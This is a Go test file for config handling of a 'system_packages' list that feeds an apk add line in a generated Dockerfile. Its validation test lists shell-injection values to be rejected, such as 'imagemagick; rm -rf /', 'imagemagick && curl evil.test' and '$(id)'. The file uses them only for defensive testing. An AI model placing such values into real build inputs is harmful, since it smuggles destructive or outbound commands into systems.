package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/spf13/viper"
)

func TestParseConfigSystemPackages(t *testing.T) {
	const base = `
type: project
oro_version: "6.1"
domains:
  - host: example.com
`

	t.Run("absent means none", func(t *testing.T) {
		conf, err := ParseConfig([]byte(base))
		if err != nil {
			t.Fatalf("ParseConfig failed: %v", err)
		}
		if len(conf.SystemPackages) != 0 {
			t.Errorf("expected no system packages, got %v", conf.SystemPackages)
		}
	})

	t.Run("list is read", func(t *testing.T) {
		conf, err := ParseConfig([]byte(base + "system_packages:\n  - imagemagick\n  - poppler-utils\n"))
		if err != nil {
			t.Fatalf("ParseConfig failed: %v", err)
		}
		want := []string{"imagemagick", "poppler-utils"}
		if !reflect.DeepEqual(conf.SystemPackages, want) {
			t.Errorf("expected %v, got %v", want, conf.SystemPackages)
		}
	})
}

// The entries end up in an `apk add` line inside a generated Dockerfile, so a value carrying
// shell syntax has to be refused while the config is being read rather than produce a build
// failure nobody can trace back to the config file.
func TestValidateSystemPackages(t *testing.T) {
	valid := []string{
		"imagemagick",
		"poppler-utils",
		"libsodium-dev",
		"gnu-libiconv=1.15-r3",
		"php84-pecl-redis@testing",
		"icu>72",
	}
	for _, pkg := range valid {
		conf := OroConfig{
			Type:           InstallTypeProject,
			OroVersion:     "6.1",
			Domains:        []DomainConfig{{Host: "example.com"}},
			SystemPackages: []string{pkg},
		}
		if err := conf.Validate(); err != nil {
			t.Errorf("expected %q to be accepted, got %v", pkg, err)
		}
	}

	invalid := []string{
		"imagemagick; rm -rf /",
		"imagemagick && curl evil.test",
		"$(id)",
		"`id`",
		"imagemagick\nRUN id",
		"--allow-untrusted",
		"",
	}
	for _, pkg := range invalid {
		conf := OroConfig{
			Type:           InstallTypeProject,
			OroVersion:     "6.1",
			Domains:        []DomainConfig{{Host: "example.com"}},
			SystemPackages: []string{pkg},
		}
		err := conf.Validate()
		if err == nil {
			t.Errorf("expected %q to be rejected", pkg)
			continue
		}
		if !strings.Contains(err.Error(), "system_packages") {
			t.Errorf("expected the error for %q to name the field, got %v", pkg, err)
		}
	}
}

// The returned list is hashed into the tag of a locally built image layer, so it has to be a
// normal form: reordering or repeating an entry in the config file is not a change that should
// cost a rebuild.
func TestGetSystemPackagesNormalizes(t *testing.T) {
	viper.Reset()
	defer viper.Reset()
	viper.Set("system_packages", []string{"poppler-utils", " imagemagick ", "poppler-utils", "", "libsodium"})

	want := []string{"imagemagick", "libsodium", "poppler-utils"}
	if got := GetSystemPackages(); !reflect.DeepEqual(got, want) {
		t.Errorf("expected %v, got %v", want, got)
	}
}

func TestGetSystemPackagesUnset(t *testing.T) {
	viper.Reset()
	defer viper.Reset()

	if got := GetSystemPackages(); len(got) != 0 {
		t.Errorf("expected no packages, got %v", got)
	}
}

// `orobox deploy-init` reads the config through viper.Unmarshal and rewrites the whole file
// through SaveConfig. A missing mapstructure tag would drop the list on that round-trip and
// silently put the project back on the published image.
func TestSaveConfigRoundTripsSystemPackages(t *testing.T) {
	viper.Reset()
	defer viper.Reset()
	viper.SetConfigType("yaml")
	source := "type: project\noro_version: \"6.1\"\nsystem_packages:\n  - imagemagick\n  - poppler-utils\n"
	if err := viper.ReadConfig(strings.NewReader(source)); err != nil {
		t.Fatal(err)
	}

	var conf OroConfig
	if err := viper.Unmarshal(&conf); err != nil {
		t.Fatalf("Unmarshal failed: %v", err)
	}
	want := []string{"imagemagick", "poppler-utils"}
	if !reflect.DeepEqual(conf.SystemPackages, want) {
		t.Fatalf("Unmarshal lost the list: %v", conf.SystemPackages)
	}

	configPath := filepath.Join(t.TempDir(), ".orobox.yaml")
	if err := SaveConfig(configPath, &conf); err != nil {
		t.Fatalf("SaveConfig failed: %v", err)
	}

	viper.Reset()
	viper.SetConfigFile(configPath)
	if err := viper.ReadInConfig(); err != nil {
		t.Fatalf("Reload failed: %v", err)
	}
	if got := GetSystemPackages(); !reflect.DeepEqual(got, want) {
		t.Errorf("expected %v after the round-trip, got %v", want, got)
	}
}

// A project that never mentioned the key must not gain an empty one: an `orobox deploy-init`
// rewrite would otherwise start writing noise into every config file it touches.
func TestSaveConfigOmitsUnsetSystemPackages(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), ".orobox.yaml")
	conf := OroConfig{Type: InstallTypeProject, OroVersion: "6.1"}
	if err := SaveConfig(configPath, &conf); err != nil {
		t.Fatalf("SaveConfig failed: %v", err)
	}

	data, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "system_packages") {
		t.Errorf("expected the key to be omitted when unset, got:\n%s", data)
	}
}
